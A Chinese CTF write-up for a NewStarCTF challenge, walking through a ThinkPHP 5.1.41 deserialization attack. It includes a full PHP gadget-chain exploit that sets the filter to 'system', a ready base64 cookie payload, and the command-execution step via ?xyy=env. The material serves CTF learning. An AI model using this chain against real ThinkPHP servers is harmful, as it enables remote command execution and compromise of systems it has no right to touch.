# Week3 Maybe You Have To think More

### 0、知识点与工具

>    Thinkphp v5.1.41 反序列化漏洞

>   工具burpsuite





### 1、寻找注入点

>   查看页面的内容并没有发现什么有用的代码，然后通过输入用户名提交完，换页面后刷新一下抓包可以发现多了一个cookie

![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221119233727.png)

>   这串cookie是base64加密后的序列化对象，是可以解密的，如下，但解密完可以发现并不知道有什么用
>
>   ```
>   O:17:"first\second\user":2:{s:8:"username";s:1:"s";s:8:"password";N;}
>   ```



>   然后在网站地址后面乱输入一些不存在的参数，可以发现报错了

![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221119234621.png)



>   然后就阔以发现是[ThinkPHP](http://www.thinkphp.cn/) V5.1.41 LTS 的序列化漏洞
>
>   然后就阔以去百度了



>   这里贴一下exp，为什么这么写我不知道（我是菜鸡），反正执行一下可以得到序列化对象字符串

```php
<?php
namespace think;
abstract class Model
{
	protected $append = [];
	private $data = [];
    // 这里是定义后门的地方
	function __construct()
	{
        // 新增一个get参数xyy
		$this->append = ["xyy"=>["hello","world"]];
		$this->data = array('xyy'=>new Request());
	}
}
class Request
{
	protected $hook = [];
	protected $filter;
	protected $config = [
	// 表单请求类型伪装变量
	'var_method'       => '_method',
	// 表单ajax伪装变量
	'var_ajax'         => '_ajax',
	// 表单pjax伪装变量
	'var_pjax'         => '_pjax',
	// PATHINFO变量名 用于兼容模式
	'var_pathinfo'     => 's',
	// 兼容PATH_INFO获取
	'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
	// 默认全局过滤方法 用逗号分隔多个
	'default_filter'   => '',
	// 域名根，如thinkphp.cn
	'url_domain_root'  => '',
	// HTTPS代理标识
	'https_agent_name' => '',
	// IP代理获取标识
	'http_agent_ip'    => 'HTTP_X_REAL_IP',
	// URL伪静态后缀
	'url_html_suffix'  => 'html',
	];
	function __construct()
	{
		$this->filter = "system";
		$this->config = ["var_ajax"=>''];
		$this->hook = ["visible"=>[$this,"isAjax"]];
	}
}
namespace think\process\pipes;
use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
	private $files = [];
	public function __construct()
	{
		$this->files=[new Pivot()];
	}
}
namespace think\model;
use think\Model;
class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>


```

### 2、获取flag

```bash
TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJ4eXkiO2E6Mjp7aTowO3M6NToiaGVsbG8iO2k6MTtzOjU6IndvcmxkIjt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6MzoieHl5IjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjk7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czowOiIiO319fX19fQ==

```



>   以上exp可以直接更改cookie里面的tp_user为上面的值，然后get传参==xyy=env==执行命令就可以获取flag了。



![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221120101543.png)





